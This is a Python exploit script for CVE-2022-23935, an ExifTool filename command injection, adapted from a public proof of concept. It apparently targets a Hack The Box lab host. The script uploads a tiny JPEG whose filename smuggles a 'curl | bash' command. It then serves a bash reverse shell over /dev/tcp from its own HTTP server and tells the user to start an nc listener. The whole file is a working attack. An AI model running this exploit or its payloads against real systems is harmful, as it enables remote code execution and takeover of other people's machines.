"""
This is a modified version of Original Script - https://github.com/BKreisel/CVE-2022-23935

Modified By: Poorduck
"""

import argparse
import rich
import socketserver
import sys
from functools import partial
from http.server import SimpleHTTPRequestHandler
import requests as r
import threading

# Smallest Possible valid JPEG
# https://gist.github.com/scotthaleen/32f76a413e0dfd4b4d79c2a534d49c0b
JPEG_BYTES = b"\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xFF\xDB\x00" \
             b"\x43\x00\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
             b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF" \
             b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xC2\x00" \
             b"\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00\xFF\xC4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00" \
             b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x08\x01\x01\x00\x01\x3F\x10"

class WebHandler(SimpleHTTPRequestHandler):
    def __init__(self, payload: str, *args, **kwargs):
        self.payload = payload
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        success("Got Request. Sent Payload 🏴‍☠️")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(self.payload.encode())
        sys.exit(0)
    
    def log_message(self, format, *args):
        pass

def error(txt: str):
    rich.print(f"[red][-] Error: [/red]{txt}")
    sys.exit(1)

def status(txt: str, prefix=""):
    rich.print(prefix + f"[blue][*][/blue] {txt}")

def success(txt: str, prefix=""):
    rich.print(prefix + f"[green][+][/green] {txt}")

def start_server(args, payload):
    status(f"Use Listener:  [bold cyan]nc -nvlp {args.port} [/bold cyan]")

    try:
        handler = partial(WebHandler, payload)
        with socketserver.TCPServer(("", args.server_port), handler) as httpd:    
            status(f"Server Started on {args.server_port} (Ctrl+C to stop)\n")
            httpd.serve_forever()
    except KeyboardInterrupt:
        status("Quitting...")
        sys.exit(0)
    except Exception as e:
        error(f"Exception: {e}")
        sys.exit(1)

def upload_func(fn):
    s = r.session()
    # s.proxies = {"http": "http://127.0.0.1:8080"}
    url = "http://eforenzics.htb/upload.php"
    resp = s.post(url, files={"image": (fn, JPEG_BYTES), "upload": (None, "upload")})
    s.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="IP Address/Host for Callback")
    parser.add_argument('port', help="Port Number for Callback")
    parser.add_argument('-l', '--listen', dest="server_port", help="Port Number for Server Listen", default=55555)
    parser.add_argument('-s', '--shell', default="bash", help="Remote Shell")
    args = parser.parse_args()

    FILENAME_FMT = "curl {ip}:{port} | {shell} |"
    REVERSE_SHELL_FMT = "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5"
    
    filename = FILENAME_FMT.format(shell=args.shell, ip=args.ip, port=args.server_port)
    payload = REVERSE_SHELL_FMT.format(shell=args.shell, ip=args.ip, port=args.port)

    # Start the HTTP server in a new thread
    server_thread = threading.Thread(target=start_server, args=(args,payload))
    server_thread.start()

    # Execute upload_func in a new thread after the server starts
    upload_thread = threading.Thread(target=upload_func, args=(filename,))
    upload_thread.start()

    # Wait for the upload to finish
    upload_thread.join()
